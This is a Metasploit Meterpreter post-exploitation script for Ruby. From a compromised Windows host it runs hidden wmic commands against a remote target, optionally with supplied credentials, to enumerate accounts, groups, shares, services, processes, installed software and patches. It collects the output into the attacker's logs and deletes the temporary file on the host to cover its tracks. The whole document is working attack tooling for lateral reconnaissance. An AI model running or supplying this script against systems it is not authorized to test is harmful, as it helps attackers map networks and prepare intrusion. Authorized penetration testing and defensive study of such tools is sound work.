# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################
session = client
# Variables for Options
helpcall = 0
rusr = nil
rpass = nil
trg = ""
# Script Options
@@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "Help menu."],
  "-t"  => [ true,  "The target address"],
  "-u"  => [ true,  "User on the target system (If not provided it will use credential of process)"],
  "-p"  => [ true,  "Password of user on target system"]
)

# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

# Create a directory for the logs
logs = ::File.join(Msf::Config.log_directory, 'scripts', 'remotewinenum')

# Create the log directory
::FileUtils.mkdir_p(logs)

# WMIC Commands that will be executed on the Target
wmic = [
  'environment list',
  'share list',
  'nicconfig list',
  'computersystem list',
  'useraccount list',
  'group list',
  'sysaccount list',
  'volume list brief',
  'logicaldisk get description,filesystem,name,size',
  'netlogin get name,lastlogon,badpasswordcount',
  'netclient list brief',
  'netuse get name,username,connectiontype,localname',
  'share get name,path',
  'nteventlog get path,filename,writeable',
  'service list brief',
  'process list brief',
  'startup list full',
  'rdtoggle list',
  'product get name,version',
  'qfe list'
]
################## Function Declarations ##################

# Function for running a list of WMIC commands stored in a array, returs string
def wmicexec(session,wmic,user,pass,trgt)
  print_status("Running WMIC Commands ....")
  tmpout = ''
  command = nil
  runfail = 0
  runningas = session.sys.config.getuid
  begin
    tmp = session.fs.file.expand_path("%TEMP%")
    # Temporary file on windows host to store results
    wmicfl = tmp + "\\wmictmp#{rand(100000)}.txt"

    wmic.each do |wmi|
      if user == nil
        print_status("The commands will be ran under the credentials of #{runningas}")
        command = "/node:#{trgt} /append:#{wmicfl} #{wmi}"
      else
        command = "/user:#{user} /password:#{pass} /node:#{trgt} /append:#{wmicfl} #{wmi}"
      end
      print_status "\trunning command wimic #{wmi}"
      r = session.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}",nil, {'Hidden' => 'true'})
      sleep(1)
      r = session.sys.process.execute("cmd.exe /c echo      Output of wmic #{wmi} from #{trgt} >> #{wmicfl}",nil, {'Hidden' => 'true'})
      sleep(1)
      r = session.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}",nil, {'Hidden' => 'true'})
      sleep(1)
      #print_status "\twmic #{command}"
      r = session.sys.process.execute("cmd.exe /c wmic #{command}", nil, {'Hidden' => true})
      #Making sure that wmic finishes before executing next wmic command
      prog2check = "wmic.exe"
      found = 0
      sleep(2)
      while found == 0
        session.sys.process.get_processes().each do |x|
          found =1
          if prog2check == (x['name'].downcase)
            sleep(0.5)
            found = 0
          end
        end
      end
      r.close
    end
    # Read the output file of the wmic commands
    wmioutfile = session.fs.file.new(wmicfl, "rb")
    until wmioutfile.eof?
      tmpout << wmioutfile.read
    end
    # Close output file in host
    wmioutfile.close
  rescue ::Exception => e
    print_status("Error running WMIC commands: #{e.class} #{e}")
  end
  # We delete the file with the wmic command output.
  c = session.sys.process.execute("cmd.exe /c del #{wmicfl}", nil, {'Hidden' => true})
  c.close
  tmpout
end

#------------------------------------------------------------------------------
# Function to generate report header
def headerbuid(session,target,dest)
  # Header for File that will hold all the output of the commands
  info = session.sys.config.sysinfo
  header =  "Date:       #{::Time.now.strftime("%Y-%m-%d.%H:%M:%S")}\n"
  header << "Running as: #{client.sys.config.getuid}\n"
  header << "From:       #{info['Computer']}\n"
  header << "OS:         #{info['OS']}\n"
  header << "Target:     #{target}\n"
  header << "\n\n\n"

  print_status("Saving report to #{dest}")
  header

end

#------------------------------------------------------------------------------
# Function Help Message
def helpmsg
  print("Remote Windows Enumeration Meterpreter Script\n" +
    "This script will enumerate windows hosts in the target enviroment\n" +
    "given a username and password or using the credential under witch\n" +
    "Meterpeter is running using WMI wmic windows native tool.\n" +
    "Usage:\n" +
    @@exec_opts.usage)
end
################## MAIN ##################
if client.platform =~ /win32|win64/
  localos = session.sys.config.sysinfo

  # Check that the command is not being ran on a Win2k host
  # since wmic is not present in Windows 2000
  if localos =~ /(Windows 2000)/
    print_status("This script is not supported to be ran from Windows 2000 servers!!!")
  else
    # Parsing of Options
    @@exec_opts.parse(args) { |opt, idx, val|
      case opt

      when "-t"
        trg = val
      when "-u"
        rusr = val
      when "-p"
        rpass = val
      when "-h"
        helpmsg
        helpcall = 1
      end

    }
    #logfile name
    dest = logs + "/" + trg + filenameinfo
    # Executing main logic of the script
    if helpcall == 0 and trg != ""

      # Making sure that is running as System a Username and Password for target machine must be provided

      if is_system? && rusr == nil && rpass == nil

        print_status("Stopped: Running as System and no user provided for connecting to target!!")

      else trg != nil && helpcall != 1

        file_local_write(dest,headerbuid(session,trg,dest))
        file_local_write(dest,wmicexec(session,wmic,rusr,rpass,trg))

      end
    elsif helpcall == 0 and trg == ""

      helpmsg
    end
  end
else
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
